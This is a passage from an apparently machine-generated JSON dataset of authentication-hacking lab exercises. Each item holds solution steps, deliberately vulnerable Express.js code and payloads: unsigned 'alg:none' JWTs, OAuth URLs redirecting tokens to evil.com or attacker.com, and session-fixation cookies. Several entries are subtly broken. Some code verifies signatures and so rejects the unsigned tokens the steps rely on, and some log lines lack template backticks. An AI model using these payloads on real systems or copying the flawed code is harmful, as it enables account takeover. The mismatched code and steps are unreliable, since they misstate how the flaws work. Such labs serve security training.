      "redirect_uri=http://evil.com/callback",
      "https://target.com/auth?client_id=abc&redirect_uri=http://evil.com/callback&response_type=token",
      "Authorization URL with malicious redirect"
    ]
  },
  {
    "Lab scenario": "Insecure JWT validation in Authorization header (None algorithm tampering)",
    "Lab Description": "The application uses JWTs for user authentication and includes the token in the Authorization header. The server does not correctly verify the algorithm used to sign the JWT. The application trusts unsigned tokens if they specify 'alg':'none'. To solve: craft a tampered token impersonating 'carlos' and access the protected profile endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a request after logging in and capture the JWT from the Authorization header.",
      "Use jwt.io or Burp Decoder to decode the token and observe the header with algorithm 'HS256'.",
      "Change the 'alg' to 'none' and remove the signature part, replacing it with an empty string.",
      "In Burp Repeater, modify the original Authorization header to use the tampered JWT with 'carlos' in the payload.",
      "Send the request to the /profile endpoint and verify if access is granted as 'carlos'."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); const SECRET = 'supersecretkey'; app.get('/profile', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (!token) return res.status(401).send('Unauthorized'); const decoded = jwt.verify(token, SECRET); if (decoded.username !== 'carlos') return res.status(403).send('Forbidden'); res.send('Welcome Carlos!'); }); app.listen(4000, () => console.log('JWT Lab on http://localhost:4000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration leads to token hijacking via redirect_uri manipulation",
    "Lab Description": "The application uses OAuth 2.0 for third-party login integration. It implements the implicit flow and allows redirect_uri values to be manipulated without proper validation. An attacker can craft a malicious authorization URL to intercept access tokens. To solve: extract a valid access token for carlos and use it to access the user's dashboard.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp to initiate OAuth login and capture the redirect URL pattern and client_id/redirect_uri used.",
      "Construct a malicious redirect_uri under your control (e.g., attacker.com) and craft a full authorization URL.",
      "Send the authorization link to the victim (social engineering assumed or simulate as Carlos) to obtain the access token from the fragment.",
      "Use Postman to call /api/user with the stolen access token in the Authorization header.",
      "Verify successful access to the user dashboard as carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const oauthClients = [{ client_id: 'trusted-client', redirect_uri: 'https://trusted.com/callback' }]; app.get('/auth', (req, res) => { const { client_id, redirect_uri } = req.query; const client = oauthClients.find(c => c.client_id === client_id); if (!client) return res.status(400).send('Invalid client'); res.redirect(`${redirect_uri}#access_token=abc123&token_type=bearer`); }); app.get('/api/user', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'abc123') return res.send('Welcome Carlos'); res.status(401).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Lab on http://localhost:4000'));",
    "payloads": [
      "https://auth.site.com/auth?client_id=trusted-client&redirect_uri=https://attacker.com/callback",
      "Authorization: Bearer abc123"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in GraphQL login mutation",
    "Lab Description": "The application uses a GraphQL endpoint for login, but does not invalidate the session token upon authentication. This allows an attacker to set a fixed session before the victim logs in. To solve: Fixate a session, trick the victim into logging in, then reuse the session ID to access the user's data.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Postman to send an initial unauthenticated request to /graphql to obtain a session cookie.",
      "Send the fixed session to the victim via phishing or simulate their login with the same session ID.",
      "Once the victim logs in, their session is tied to your predefined session ID.",
      "Replay the session cookie on the /graphql endpoint to access protected data.",
      "Query for { me { email, name } } to verify access to carlos’s account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'keyboard cat', resave: false, saveUninitialized: true })); app.use(express.json()); app.post('/graphql', (req, res) => { const query = req.body.query; if (query.includes('mutation login')) { const { username, password } = req.body.variables; if (username === 'carlos' && password === 'password') req.session.user = 'carlos'; return res.json({ data: { login: true } }); } if (query.includes('me')) { if (req.session.user === 'carlos') return res.json({ data: { me: { name: 'Carlos', email: 'carlos@example.com' } } }); return res.status(403).json({ error: 'Unauthorized' }); } res.status(400).send('Bad Request'); }); app.listen(4000, () => console.log('GraphQL Session Fixation Lab on http://localhost:4000'));",
    "payloads": [
      "mutation login($username:String!, $password:String!) { login(username:$username, password:$password) }",
      "{ \"username\": \"carlos\", \"password\": \"password\" }",
      "query { me { name, email } }"
    ]
  },
  {
    "Lab scenario": "JWT signature bypass in authorization header",
    "Lab Description": "The application uses JSON Web Tokens (JWT) for user session management. It decodes the token and verifies it using the algorithm specified in the token header. The implementation trusts the 'alg' field from user-controlled input, making it vulnerable to algorithm confusion. The application treats unsigned tokens as valid. To solve: forge an unsigned JWT to impersonate the admin user and access /admin/dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Capture a valid JWT using Burp Suite or browser dev tools from the Authorization header.",
      "2. Decode the JWT using jwt.io or Postman and examine the header and payload.",
      "3. Modify the header to set 'alg' to 'none' and the payload 'user' to 'admin'. Remove the signature.",
      "4. Replace the original token in the Authorization header with the crafted token.",
      "5. Send the request to /admin/dashboard and verify access to the admin page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.use(require('body-parser').json()); const secret = 'supersecret'; app.get('/admin/dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, secret); if (decoded.user === 'admin') return res.send('Welcome Admin'); res.status(403).send('Access denied'); } catch (err) { res.status(400).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT Signature Bypass Lab running on http://localhost:4000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
      "{\"alg\":\"none\"}.{ \"user\":\"admin\" }",
      "Authorization: Bearer <JWT without signature>"
    ]
  },
  {
    "Lab scenario": "Session fixation in login flow",
    "Lab Description": "The application issues a session cookie before authentication and does not regenerate the session ID after login. This allows an attacker to fix the session ID of a victim. The attacker can trick a victim into using a known session ID, and once they log in, the attacker can use the same session ID to hijack the session. To solve: gain access to Carlos's account using a fixed session ID.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to initiate a session and capture the Set-Cookie header (e.g., sessionId=abc123).",
      "2. Trick the victim into visiting a crafted link that includes the known session cookie (e.g., by using a CSRF-like redirect or injecting a malicious image).",
      "3. Wait until the victim logs in with the attacker-fixed session ID.",
      "4. Use the same session cookie to send a GET request to /my-account.",
      "5. Verify access to Carlos's account and extract personal data from the page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); let sessions = {}; let users = [{ username: 'carlos', password: 'pass123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.sessionId] = user.username; res.send('Login successful'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const username = sessions[req.cookies.sessionId]; if (username) res.send(`Account page for ${username}`); else res.status(403).send('Not authenticated'); }); app.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
    "payloads": [
      "Cookie: sessionId=abc123",
      "GET /?sessionId=abc123",
      "Hijack session after login using pre-set ID"
    ]
  },
  {
    "Lab scenario": "OAuth token theft using open redirect in callback URL",
    "Lab Description": "The application uses OAuth 2.0 with an implicit flow and accepts arbitrary redirect URIs after authorization. This introduces an open redirect vulnerability. An attacker can steal the access token by injecting a malicious redirect URL in the OAuth flow. To solve: craft a malicious OAuth URL that redirects the access token to an attacker-controlled domain and extract the token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Start Burp Suite and inspect the login with Google OAuth flow.",
      "2. Notice that the redirect_uri parameter is not validated strictly by the server.",
      "3. Construct a malicious OAuth authorization URL that includes your domain (e.g., https://attacker.com/callback#access_token=... as the redirect_uri).",
      "4. Trick the victim into clicking the crafted URL (via phishing or injected content).",
      "5. Extract the token from the redirected request captured in your server logs or Burp Collaborator and use it to access protected resources."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth/callback', (req, res) => { const token = req.query.token; res.send(`Logged in with token: ${token}`); }); app.listen(4000, () => console.log('OAuth Redirect Lab running on http://localhost:4000'));",
    "payloads": [
      "https://auth.example.com/oauth/authorize?response_type=token&client_id=123&redirect_uri=https://evil.com/#access_token=steal",
      "OAuth redirect_uri=https://attacker.com#access_token=xyz",
      "Token leak via implicit flow redirection"
    ]
  },
  {
    "Lab scenario": "JWT tampering vulnerability in session validation middleware",
    "Lab Description": "The application uses JSON Web Tokens (JWT) for session management. However, it incorrectly trusts the 'alg' field in the JWT header without enforcing strict validation. The application uses these tokens to identify authenticated users. To solve: Forge a valid JWT for the user 'carlos' and access their My account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the JWT after logging in with your own account using Burp Suite.",
      "Decode the JWT using jwt.io or Burp Decoder and observe the use of 'alg': 'none'.",
      "Modify the JWT header to set 'alg' to 'none' and the payload to {\"username\": \"carlos\"}.",
      "Remove the JWT signature entirely and use Postman to submit an authenticated request with the modified token.",
      "Visit the /my-account endpoint while using the forged JWT to access Carlos's data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('cookie-parser')()); const users = ['carlos', 'admin', 'wiener']; app.get('/my-account', (req, res) => { const token = req.cookies.token; if (!token) return res.status(401).send('Not logged in'); const decoded = jwt.decode(token, { complete: true }); if (!decoded || !decoded.payload.username) return res.status(403).send('Invalid token'); if (!users.includes(decoded.payload.username)) return res.status(403).send('User not found'); res.send(`Account page for ${decoded.payload.username}`); }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "Session fixation via pre-authenticated session reuse in login handler",
    "Lab Description": "This application mishandles session IDs and does not issue a new session upon successful authentication. The attacker can set a fixed session ID before login and trick a victim into logging in with that same session. To solve: Log in as Carlos by forcing a session ID and reusing it post-login.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Start a browser session and use Burp Suite to intercept the GET /login request.",
      "Modify the request to include a custom cookie: session=attacker123.",
      "Send the link with the crafted session cookie to Carlos and simulate a login using social engineering or CSRF.",
      "Once Carlos logs in, reuse the same session cookie (attacker123) from your browser.",
      "Visit /account to confirm the session is authenticated as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: false })); app.use(session({ secret: 'weak-secret', resave: false, saveUninitialized: true })); const users = { carlos: 'hunter2' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { req.session.user = username; res.redirect('/account'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { if (req.session.user) res.send(`Welcome ${req.session.user}`); else res.status(403).send('Access denied'); }); app.listen(4000);",
    "payloads": [
      "Cookie: session=attacker123",
      "http://victim-site.com/login?phpsessid=attacker123",
      "Set-Cookie: session=attacker123; Path=/; HttpOnly"
    ]
  },
  {
    "Lab scenario": "OAuth redirect URI manipulation in authorization endpoint",
    "Lab Description": "This application implements OAuth2 authorization but fails to strictly validate redirect URIs, allowing attackers to manipulate the flow and steal access tokens. The authorization server trusts unvalidated 'redirect_uri' values. To solve: Capture a valid OAuth token for Carlos and use it to call the protected /api/user endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the OAuth request initiated by the client and observe the redirect_uri parameter.",
      "Modify the redirect_uri parameter to point to your attacker-controlled domain (http://evil.com/callback).",
      "Send a phishing link with the modified URL to Carlos to trick him into authorizing.",
      "Capture the token in your hosted endpoint (http://evil.com/callback?access_token=...).",
      "Replay the stolen access token using Postman to call GET /api/user with Authorization: Bearer <token>."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const tokens = {}; app.get('/auth', (req, res) => { const { redirect_uri, username } = req.query; if (username === 'carlos') { const token = 'carlos-oauth-token'; tokens[username] = token; res.redirect(`${redirect_uri}?access_token=${token}`); } else { res.status(400).send('Missing user'); } }); app.get('/api/user', (req, res) => { const authHeader = req.headers.authorization; if (authHeader && authHeader === 'Bearer carlos-oauth-token') { res.send('User: carlos, Email: carlos@example.com'); } else { res.status(403).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "http://localhost:4000/auth?username=carlos&redirect_uri=http://evil.com/callback",
      "GET /api/user HTTP/1.1\nAuthorization: Bearer carlos-oauth-token",
      "http://victim-app.com/auth?redirect_uri=http://attacker.tld/callback"
    ]
  },
  {
    "Lab scenario": "JWT tampering vulnerability in session management",
    "Lab Description": "The application uses JSON Web Tokens (JWTs) for session management. However, it fails to properly verify the token's signature. The `alg` field in the JWT header is set to `none`, and the application accepts tokens without verifying their integrity. The application trusts all fields in the token, including the `username` claim. To solve: Forge a JWT that impersonates the user 'carlos' and access their account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture the JWT from a login request using Burp Suite.",
      "Use jwt.io or Burp Decoder to inspect the token and note the use of 'alg':'none'.",
      "Craft a new token with the payload {\"username\":\"carlos\"} and set the alg to none, leaving the signature blank.",
      "Replace your JWT cookie with the forged token using Burp's Modify Cookie feature.",
      "Refresh the /my-account endpoint and confirm access to Carlos's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); app.use(require('cookie-parser')()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, 'secret', { algorithm: 'none' }); res.cookie('auth', token); res.send('Logged in'); }); app.get('/my-account', (req, res) => { const token = req.cookies.auth; const decoded = jwt.decode(token); if (decoded && decoded.username === 'carlos') { res.send('Account details for carlos'); } else { res.send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "JWT with header: {\"alg\":\"none\"} and payload: {\"username\":\"carlos\"}"
    ]
  },
  {
    "Lab scenario": "OAuth token misconfiguration in API gateway authorization",
    "Lab Description": "The API gateway uses OAuth tokens for authorization. However, it fails to validate the 'aud' claim in the access token. This allows an attacker to reuse a token issued for a different client (token confusion). To solve: Use a valid OAuth access token from your own app and access the protected endpoint of a privileged client to view Carlos's email address.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to obtain a valid OAuth token from your registered client using the authorization code flow.",
      "Inspect the token in jwt.io and note the 'aud' claim is not specific to your client.",
      "Send a GET request to /api/client-a/data with your token in the Authorization header.",
      "Observe that the endpoint accepts your token and returns privileged data.",
      "Extract Carlos’s email address from the response to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); app.use((req, res, next) => { const token = req.headers.authorization?.split(' ')[1]; if (!token) return res.status(401).send('Missing token'); const payload = jwt.decode(token); req.user = payload; next(); }); app.get('/api/client-a/data', (req, res) => { if (req.user && req.user.scope.includes('read:data')) { res.json({ email: 'carlos@example.com' }); } else { res.status(403).send('Forbidden'); } }); const PORT = 3001; app.listen(PORT, () => console.log(`OAuth Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "OAuth token from Client-B reused on Client-A’s endpoint",
      "Valid JWT with aud mismatch: {\"aud\":\"Client-B\", \"scope\":\"read:data\"}",
      "Access token from attacker app reused on protected resource"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login handler",
    "Lab Description": "The application assigns session identifiers before authentication and does not regenerate them after login. This allows an attacker to set a fixed session and trick a victim into logging in under a known session ID. The attacker can then hijack the session. To solve: Fix a session, get Carlos to authenticate into it, and access his account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to browse to the site and capture the Set-Cookie header with session ID before login.",
      "Send a crafted link to Carlos with the fixed session ID via social engineering or intercept his browser.",
      "Once Carlos logs in using the fixed session, reuse the same session ID in your browser.",
      "Access /my-account with the hijacked session and confirm it loads Carlos’s account.",
      "Validate the login success through a post-login token or visual change."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); let sessions = {}; app.get('/', (req, res) => { const sid = req.cookies.sid || Math.random().toString(36).substring(2); res.cookie('sid', sid); res.send('Welcome to vulnerable site'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'letmein') { sessions[req.cookies.sid] = 'carlos'; res.send('Logged in'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sid]; if (user === 'carlos') res.send('Account details for carlos'); else res.send('Access denied'); }); const PORT = 8080; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Fixed session ID: sid=knownvalue",
      "Trick victim into authenticating under sid=knownvalue",
      "Access /my-account with same sid cookie"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion in API authorization",
    "Lab Description": "This lab exposes a REST API that uses JSON Web Tokens (JWTs) to control access. The server trusts the 'alg' field in the JWT header and does not validate its signature properly when 'alg' is set to 'none'. The application accepts user-supplied tokens without enforcing signature validation. To solve: craft a forged token to impersonate the admin user and access the protected /admin endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to intercept a legitimate login request and capture the JWT returned in the Authorization header.",
      "Decode the JWT using jwt.io and inspect the payload structure and algorithm used.",
      "Change the alg header to 'none' and modify the payload's 'user' field to 'admin'. Remove the signature entirely.",
      "Use Postman to send a GET request to /admin with the manipulated JWT in the Authorization header.",
      "Verify access by confirming the admin panel content is returned in the response."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = { 'admin': { role: 'admin' }, 'user': { role: 'user' } }; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username }, 'supersecret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = jwt.decode(token); if (payload.user === 'admin') return res.send('Admin Access Granted'); return res.status(403).send('Forbidden'); } try { const verified = jwt.verify(token, 'supersecret'); if (verified.user === 'admin') return res.send('Admin Access Granted'); } catch (e) { res.status(403).send('Invalid token'); } }); const PORT = 3000; app.listen(PORT, () => console.log(JWT Lab running on http://localhost:${PORT}));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID",
    "Lab Description": "This lab has a vulnerable login flow where session identifiers are issued before authentication and not regenerated after login. The session ID is predictable and can be shared across users. The application sets a cookie named session_id which is trusted without being rotated post-login. To solve: fix a session ID before login and force the victim to use it to hijack their authenticated session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to initiate a login flow and observe the issued session_id cookie prior to login.",
      "Note the format of the session ID (e.g., static prefix + incremental token).",
      "Send the login page with the fixed session ID to the victim (simulated).",
      "After the victim logs in using that session, reuse the same session ID in your browser.",
      "Access the /my-account endpoint using the fixed session ID and confirm access to victim's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); let sessions = {}; let users = { 'carlos': { password: 'secret', accountData: 'Sensitive Info' } }; app.get('/login', (req, res) => { let sid = 'sess_' + Math.floor(Math.random() * 1000); res.cookie('session_id', sid); res.send('Login page with pre-issued session'); }); app.post('/login', (req, res) => { let sid = req.cookies.session_id; let { username, password } = req.body; if (users[username] && users[username].password === password) { sessions[sid] = username; res.send('Logged in'); } else { res.send('Invalid'); } }); app.get('/my-account', (req, res) => { let user = sessions[req.cookies.session_id]; if (user) res.send('Account data: ' + users[user].accountData); else res.status(403).send('Forbidden'); }); const PORT = 4000; app.listen(PORT, () => console.log(Session Fixation Lab running on http://localhost:${PORT}));",
    "payloads": [
      "Cookie: session_id=sess_1337",
      "POST /login with Cookie: session_id=sess_1337",
      "GET /my-account with Cookie: session_id=sess_1337"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration token reuse attack",
    "Lab Description": "This lab simulates an OAuth authorization server that fails to validate audience claims (aud) on access tokens. As a result, tokens issued for one client can be reused against another. The client application does not verify whether the token was issued for its own audience. To solve: use a token issued for one OAuth client to access a protected endpoint in another context.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP or Postman to initiate OAuth flow and obtain an access token for a benign client (e.g., photo app).",
      "Decode the JWT access token and inspect the 'aud' claim which incorrectly allows all resources.",
      "Send the same token to a different application (e.g., finance app) that incorrectly skips audience validation.",
      "Use Postman to call GET /finance-data endpoint with the reused access token.",
      "Verify successful access and extract user financial data to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const financeData = { 'carlos': 'Bank Balance: $9000' }; app.get('/finance-data', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const payload = jwt.verify(token, 'oauthsharedsecret');  if (payload.sub === 'carlos') { return res.send(financeData['carlos']); } return res.status(403).send('Access Denied'); } catch (e) { return res.status(401).send('Invalid token'); } }); const PORT = 5000; app.listen(PORT, () => console.log(OAuth Lab running on http://localhost:${PORT}));",
    "payloads": [
      "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYXJsb3MiLCJhdWQiOiJwaG90by1hcHAifQ.mFMeNz9sZHXvl_YceRmJRW2skH43FF3A54gtpPYsOKo",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYXJsb3MiLCJhdWQiOiJhbGwifQ._DztOQpn9jK9i8I1vGE-FhKo8zEl5EtXfU2RoHOuWUs"
    ]
  },
  {
    "Lab scenario": "Session fixation via flawed login redirect",
    "Lab Description": "This lab implements a login flow that improperly handles session tokens. The application creates a session ID before authentication and does not regenerate it upon successful login. An attacker can abuse this behavior to fix their own session ID on a victim’s account. To solve: Hijack Carlos’s session by forcing a session ID fixation and access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite Proxy to intercept GET /login request while logged out.",
      "Observe Set-Cookie header assigning a session value before login. Send this request to Burp Repeater.",
      "Note the fixed session value, and manually craft a phishing link: /login?sessionid=attackerSessionValue.",
      "Log in with Carlos’s credentials while preserving the attacker’s pre-set session ID.",
      "Verify that the session persists across pages by navigating to /account with attacker’s session value."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'secret123', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'securepass' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.redirect('/account'); } else { res.status(401).send('Invalid login'); } }); app.get('/account', (req, res) => { if (req.session.user) res.send('Account page for ' + req.session.user); else res.status(403).send('Unauthorized'); }); app.listen(3000);",
    "payloads": [
      "GET /login?sessionid=attackerSession123",
      "POST /login HTTP/1.1 with Cookie: session=attackerSession123",
      "GET /account HTTP/1.1 with Cookie: session=attackerSession123"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion leading to privilege escalation",
    "Lab Description": "This lab uses JWT for session management but accepts unsigned tokens by trusting the 'alg' value from the token header. This allows attackers to change the algorithm to 'none' and forge tokens with elevated privileges. To solve: Craft a forged token granting admin privileges and access the admin panel.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture a JWT using Burp Suite while logged in as a normal user.",
      "Decode the JWT using jwt.io or Postman and observe 'alg': 'HS256'.",
      "Modify the header to 'alg': 'none' and add \"role\":\"admin\" to payload.",
      "Remove the signature and send the forged token using Burp Repeater.",
      "Send a GET request to /admin with the forged token as Authorization: Bearer [token] and confirm admin access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', password: 'jwtpass', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username: user.username, role: user.role }, 'secretkey'); res.json({ token }); } else { res.status(401).json({ error: 'Unauthorized' }); } }); app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, 'secretkey'); if (decoded.role === 'admin') return res.send('Welcome Admin'); res.status(403).send('Forbidden'); } catch { res.status(400).send('Invalid token'); } }); app.listen(3000);",
    "payloads": [
      "{ \"alg\": \"none\", \"typ\": \"JWT\" }.{ \"username\": \"carlos\", \"role\": \"admin\" }.",
      "Authorization: Bearer [unsigned JWT with admin role]",
      "GET /admin HTTP/1.1 with unsigned token"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration leaking authorization codes",
    "Lab Description": "This lab uses OAuth for third-party login but fails to validate the redirect_uri properly. An attacker can abuse this to capture an authorization code meant for another user. To solve: Hijack Carlos’s OAuth code and use it to log in as him.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to analyze the OAuth flow and locate redirect_uri parameter.",
      "Craft a malicious redirect_uri under attacker’s control (e.g., https://attacker.com/callback).",
      "Send phishing link to Carlos: /auth?client_id=lab-client&redirect_uri=https://attacker.com/callback",
      "Capture Carlos’s code via attacker-controlled endpoint.",
      "Send a request to /token endpoint exchanging the stolen code for an access token, then use it to access /my-account as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const oauthCodes = {}; app.get('/auth', (req, res) => { const { client_id, redirect_uri, state } = req.query; const code = 'authcode123'; oauthCodes[code] = 'carlos'; const redirect = `${redirect_uri}?code=${code}&state=${state}`; res.redirect(redirect); }); app.post('/token', (req, res) => { const { code } = req.body; if (oauthCodes[code]) res.json({ access_token: 'token-carlos' }); else res.status(400).send('Invalid code'); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer token-carlos') res.send('Welcome back, carlos!'); else res.status(401).send('Unauthorized'); }); app.listen(3000);",
    "payloads": [
      "/auth?client_id=lab-client&redirect_uri=https://attacker.com/callback&state=1234",
      "POST /token HTTP/1.1 with code=authcode123",
      "Authorization: Bearer token-carlos",
      "GET /my-account HTTP/1.1 with Bearer token-carlos"
    ]
  },
  {
    "Lab scenario": "Session fixation via unvalidated token reuse in REST login flow",
    "Lab Description": "The application improperly handles session identifiers during login, allowing a pre-auth session token to persist after authentication. The application sets a session cookie before authentication and does not regenerate it upon successful login. To solve: Hijack a logged-in session by fixing the session ID prior to user authentication.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept GET /login and record the pre-auth Set-Cookie header.",
      "Send a POST /login request using valid credentials but with the previously issued session cookie manually added.",
      "Observe that the session cookie remains unchanged after login, indicating successful fixation.",
      "Send the fixed session cookie to another browser and reuse it after the victim logs in.",
      "Access /my-account endpoint using the fixed cookie and verify session hijack."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.json()); const sessions = {}; const users = { 'carlos': 'letmein123' }; app.get('/login', (req, res) => { const sid = 'sess_' + Math.random().toString(36).substring(2); sessions[sid] = { authenticated: false }; res.cookie('sid', sid); res.send('Login page loaded'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.sid; if (users[username] === password && sid && sessions[sid]) { sessions[sid].authenticated = true; res.send('Logged in'); } else { res.status(401).send('Unauthorized'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; if (sessions[sid]?.authenticated) { res.send('Welcome carlos'); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
    "payloads": [
      "POST /login HTTP/1.1 with Cookie: sid=sess_fixation",
      "GET /my-account HTTP/1.1 with Cookie: sid=sess_fixation"
    ]
  },
  {
    "Lab scenario": "JWT token signature spoofing using 'none' algorithm in Authorization header",
